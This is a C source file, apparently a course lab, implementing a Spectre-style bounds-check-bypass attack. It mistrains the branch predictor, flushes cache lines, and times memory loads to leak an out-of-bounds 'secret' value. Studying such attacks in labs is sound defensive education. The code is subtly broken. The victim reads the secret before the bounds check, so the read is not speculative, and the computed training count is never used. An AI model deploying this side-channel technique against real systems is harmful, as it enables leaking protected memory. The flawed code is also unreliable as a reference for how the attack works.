#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)

#define L1_THRESHOLD 40
#define ITERATIONS 1

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
int limit = 20;
void victim_part2(int *shared_mem, size_t offset) {
    int secret_data = shared_mem[offset];
    size_t mem_index = (size_t)(4096 * (unsigned int)(secret_data % 100));

    clflush(&limit); // to delay subsequent branch

    if (offset < limit) {
        volatile int temp = shared_mem[mem_index / sizeof(int)];
    }
}

int main(int argc, char **argv) {
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    *((char *)huge_page) = 1; // dummy write to trigger page allocation

    uint64_t result[100] = {0};
    for (int iter = 0; iter < ITERATIONS; iter++) {
        //** STEP 1: Allocate an array into the mmap */
        int *secret_array = (int *)huge_page;

        // Initialize the array
        for (int i = 0; i < 100; i++) {
            secret_array[i ] = i;
        }

        // Ensure the array is not in cache
        for (int i = 0; i < 100; i++) {
            size_t mem_index = (size_t)(i * 4096);
            clflush(&secret_array[mem_index / sizeof(int)]);
        }
        clflush(&limit); // to delay subsequent branch

        //** STEP 2: Mistrain the branch predictor by calling victim function here */
        // To prevent any kind of patterns, ensure each time you train it a different number of times
        int num_train = rand() % (400 - 300 + 1) + 300;
        for (int i = 0; i < 5; i++) {
            victim_part2(secret_array, i % limit);
        }

        //** STEP 3: Clear cache using clflsuh from utility.h */
        for (int i = 0; i < 100; i++) {
            size_t mem_index = (size_t)(i * 4096);
            clflush(&secret_array[mem_index / sizeof(int)]);
        }

        //** STEP 4: Call victim function again with bounds bypass value */
        size_t malicious_offset = 47;
        victim_part2(secret_array, malicious_offset);

        //** STEP 5: Reload mmap to see load times */
        // Just read the mmap's first 100 integers
        for (int i = 0; i < 100; i++) {
            size_t mem_index = (size_t)(i * 4096);
            uint64_t time = measure_one_block_access_time((uint64_t)&secret_array[mem_index / sizeof(int)]);
            result[i] += time;
        }
    }

    // STEP 6: Print out the cache load times
    for (int i = 0; i < 100; i++) {
        result[i] /= ITERATIONS;
        if (result[i] < L1_THRESHOLD) {
            printf("Load time for secret_array[%d]: %ld (hit)\n", i, result[i]);
        } 
    }
    return 0;
}